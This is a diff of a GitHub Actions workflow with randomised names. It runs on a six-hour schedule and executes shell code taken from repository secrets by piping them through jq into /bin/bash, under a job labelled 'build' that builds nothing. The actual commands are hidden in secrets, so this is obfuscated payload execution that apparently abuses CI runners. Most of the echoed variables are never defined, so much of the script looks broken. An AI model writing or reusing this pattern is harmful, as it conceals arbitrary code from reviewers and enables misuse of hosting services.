@@ -1,10 +1,10 @@
 name: lengrufeng6819
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 4/6 * * *'
-
-jobs:  # 16759
+    - cron: '22 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,11 +12,14 @@ jobs:  # 16759
       - uses: actions/checkout@v4
       - name: lengrufeng6819
         env:
-          rpv87847: ${{ secrets.rpv87847 }}
+          syll83643: ${{ secrets.syll83643 }}
         run: |
-          echo $rpv87847 | jq -r .vdzqh8 | /bin/bash
-          echo $ivlq33146 | jq -r .hs22 | /bin/bash
-          echo $a837 | jq -r .dlm37513 | /bin/bash
-          echo $m97426 | jq -r .ehilx7079 | /bin/bash
-          echo $roddu08882 | jq -r .lsa781 | /bin/bash
+          echo $syll83643 | jq -r .tbgm3677 | /bin/bash
+          echo $lwj35 | jq -r .vff9832 | /bin/bash
+          echo $t02434 | jq -r .wt2 | /bin/bash
+          echo $igow9091 | jq -r .ztsf2910 | /bin/bash
+          echo $e0919 | jq -r .qy30507 | /bin/bash
+          echo $sv519 | jq -r .qs2 | /bin/bash
+          echo $mzui5 | jq -r .aajh6 | /bin/bash
+          echo $lx2173 | jq -r .s136 | /bin/bash
 
